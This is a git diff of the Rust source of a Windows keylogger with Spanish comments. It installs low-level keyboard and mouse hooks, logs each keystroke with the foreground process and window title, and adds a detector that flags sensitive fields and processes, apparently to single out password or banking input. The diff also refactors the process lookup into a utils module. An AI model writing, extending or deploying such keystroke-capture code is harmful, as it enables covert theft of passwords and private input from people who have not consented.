@@ -19,6 +19,9 @@ use winapi::um::winreg::{RegOpenKeyExW, RegQueryValueExW, RegCloseKey, HKEY_LOCA
 use winapi::um::processthreadsapi::OpenProcess;
 use winapi::um::psapi::GetModuleBaseNameW;
 use winapi::um::winnt::PROCESS_QUERY_INFORMATION;
+use std::fs::OpenOptions;
+use std::io::{self, Write};
+
 
 // windows api functions
 use winapi::um::winuser::{
@@ -114,8 +117,10 @@ mod log;
 mod encryption;
 mod classifier;
 mod scheduler;
+mod utils;
 
-
+// Usar las funciones del módulo utils
+use crate::utils::{get_active_process_info, is_sensitive_process, ActiveProcessInfo};
 
 
 fn check_admin_privileges() -> bool {
@@ -182,6 +187,7 @@ fn get_mouse_coords() -> Result<(i32, i32), Box<dyn std::error::Error>> {
 }
 
 
+
 fn main() {
     
 
@@ -189,11 +195,16 @@ fn main() {
     println!("Starting keylogger...");
     println!("Press Ctrl+C to stop...");
     println!("Getting basic info");
+
+
     if let Err(e) = get_basic_info() {
         eprintln!("Error getting system info: {}", e);
     }
 
-
+    // Inicializar el detector de campos sensibles
+    unsafe {
+        FIELD_DETECTOR = Some(SensitiveFieldDetector::new());
+    }
 
     // Agregar manejo de señales para cleanup limpio
     ctrlc::set_handler(move || {
@@ -313,7 +324,7 @@ unsafe extern "system" fn low_level_keyboard_proc(
             // TODO: Aquí llamar a función de logging/encryption
 
             // Obtener información del proceso activo
-                if let Ok((process_name, window_title)) = check_active_process() {
+            if let Ok((process_name, window_title)) = crate::utils::check_active_process() {
                 let mut log_entry = LogEntry::new_keystroke(&key_char, &process_name, &window_title);
                 
                 // Verificar si hay campos sensibles en el contexto actual
@@ -357,14 +368,22 @@ unsafe extern "system" fn low_level_mouse_proc(
         }
         
         // Obtener información del proceso activo en cada click
-        match check_active_process() {
-            Ok((process_name, window_title)) => {
-                println!("Active Process: {} | Window: '{}'", process_name, window_title);
-                },
+          match get_active_process_info() {
+            Ok(process_info) => {
+                println!("Active Process: {} | Window: '{}'", 
+                    process_info.process_name, 
+                    process_info.window_title
+                );
+                
+                // Verificar si es sensible
+                if is_sensitive_process(&process_info) {
+                    println!("⚠️  SENSITIVE PROCESS DETECTED! ⚠️");
+                }
+            },
             Err(e) => eprintln!("Error getting active process: {}", e),
         }
         
-        println!("---"); // Separador para claridad
+        println!("---");
     }
     
     unsafe { CallNextHookEx(MOUSE_HOOK, n_code, w_param, l_param) }
@@ -417,6 +436,9 @@ fn capture_input() -> Result<(), Box<dyn std::error::Error>> {
     Ok(())
 }
 
+
+
+// ==== FUNCIONES AUXILIARES PARA INFO DEL SISTEMA ====
 
 fn get_windows_version() -> String {
     // Método 1: Intentar leer desde el registro (más confiable)
@@ -563,63 +585,5 @@ fn get_system_architecture() -> String {
             0 => "x86".to_string(),      // PROCESSOR_ARCHITECTURE_INTEL
             _ => "Unknown".to_string(),
         }
-    }
-}
-
-
-
-// Función para obtener el nombre del proceso activo
-
-fn check_active_process() -> Result<(String, String), Box<dyn std::error::Error>> {
-    unsafe {
-        // Obtener la ventana activa
-        let hwnd = GetForegroundWindow();
-        if hwnd.is_null() {
-            return Err("No active window found".into());
-        }
-        
-        // Obtener el título de la ventana
-        let mut window_title = [0u16; 512];
-        let title_len = GetWindowTextW(hwnd, window_title.as_mut_ptr(), window_title.len() as i32);
-        let window_title_str = if title_len > 0 {
-            let title_slice = &window_title[..title_len as usize];
-            OsString::from_wide(title_slice).to_string_lossy().to_string()
-        } else {
-            "No Title".to_string()
-        };
-        
-        // Obtener el ID del proceso
-        let mut process_id: DWORD = 0;
-        GetWindowThreadProcessId(hwnd, &mut process_id);
-        
-        if process_id == 0 {
-            return Err("Could not get process ID".into());
-        }
-        
-        // Abrir el proceso para obtener información
-        let process_handle = OpenProcess(PROCESS_QUERY_INFORMATION, 0, process_id);
-        if process_handle.is_null() {
-            return Ok(("Unknown Process".to_string(), window_title_str));
-        }
-        
-        // Obtener el nombre del proceso
-        let mut process_name = [0u16; 256];
-        let name_len = GetModuleBaseNameW(
-            process_handle,
-            std::ptr::null_mut(),
-            process_name.as_mut_ptr(),
-            process_name.len() as DWORD,
-        );
-        
-        CloseHandle(process_handle);
-        
-        let process_name_str = if name_len > 0 {
-            let name_slice = &process_name[..name_len as usize];
-            OsString::from_wide(name_slice).to_string_lossy().to_string()
-        } else {
-            "Unknown".to_string()
-        };
-        
-        Ok((process_name_str, window_title_str))
     }
 }
